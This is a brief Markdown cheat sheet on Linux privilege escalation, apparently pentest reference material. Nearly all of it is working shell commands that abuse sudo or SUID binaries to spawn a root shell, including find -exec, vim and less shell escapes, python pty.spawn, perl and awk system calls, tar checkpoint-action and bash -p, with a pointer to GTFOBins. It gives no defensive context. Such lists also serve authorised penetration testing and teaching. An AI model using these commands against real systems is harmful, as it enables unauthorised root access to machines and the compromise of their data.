# Linux Sudo Privilege Escalation

## Check permissions
```bash
sudo -l
```

## Exploitable sudo entries
```bash
# Any command as sudo:
sudo -u root /bin/bash
sudo /bin/bash
sudo su -

# Abusable binaries:
sudo find / -exec /bin/sh \;
sudo vim -c '!sh'
sudo man man
sudo less /etc/passwd
sudo nmap --interactive
sudo python -c 'import pty; pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

## GTFOBins Reference
> Check: https://gtfobins.github.io

When you see binaries with SUID or sudo:
```bash
nmap --interactive            # !sh
vim -c ':!/bin/sh'            # Vim shell escape
find / -exec /bin/sh \; -quit
less /etc/passwd              # !bash
more /etc/passwd              # !bash
man man                       # !bash
awk 'BEGIN {system("/bin/sh")}'
python -c 'import os;os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
bash -p                       # Preserve SUID
git help                      # !bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
